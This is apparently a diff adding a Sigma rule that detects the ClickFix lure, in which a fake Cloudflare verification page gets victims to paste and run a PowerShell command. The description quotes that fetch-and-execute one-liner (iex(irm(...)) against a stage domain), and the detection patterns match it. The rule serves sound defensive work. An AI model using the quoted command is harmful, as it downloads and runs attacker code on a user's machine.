@@ -1,0 +1,39 @@
+title: ClickFix Clipboard PowerShell From Fake Cloudflare Verification Page
+id: 6f3c1d9a-4b2e-4a77-9c1d-8e5a2f0b7d31
+status: experimental
+description: Detects the ClickFix PowerShell one-liner that the third-party[.]com placeholder domain serves to Windows user agents. The fake Cloudflare "Performing security verification" page copies powershell "Write-Host(&{iex(irm('<stage-domain>/f'))})2>$null" to the clipboard and instructs the victim to press Win+R, paste and run it, downloading and executing the second-stage script.
+references:
+  - https://www.bleepingcomputer.com/news/security/placeholder-domain-used-in-dev-docs-now-serves-clickfix-attacks/
+  - https://www.malwarebytes.com/blog/news/2026/09/criminals-turn-placeholder-domain-into-clickfix-trap
+  - https://www.manifold.security/blog/placeholder-domains-ads-serve-scams
+  - https://app.any.run/tasks/f325fdb1-9aae-4626-b7eb-098982ae58aa/
+author: Tia N. List
+date: 2026/09/26
+tags:
+  - attack.t1189
+  - attack.t1204
+  - attack.t1059
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith:
+      - '\powershell.exe'
+      - '\pwsh.exe'
+    CommandLine|contains|all:
+      - 'Write-Host(&'
+      - 'iex(irm('
+      - '2>$null'
+  selection_stagedownload:
+    Image|endswith:
+      - '\powershell.exe'
+      - '\pwsh.exe'
+    CommandLine|contains:
+      - 'elxxvvx'
+      - 'update2.zip'
+  condition: selection or selection_stagedownload
+falsepositives:
+  - Benign PowerShell one-liners constructed with the same Write-Host/iex(irm()) idiom
+  - Red team or security validation exercises simulating ClickFix lures
+level: high
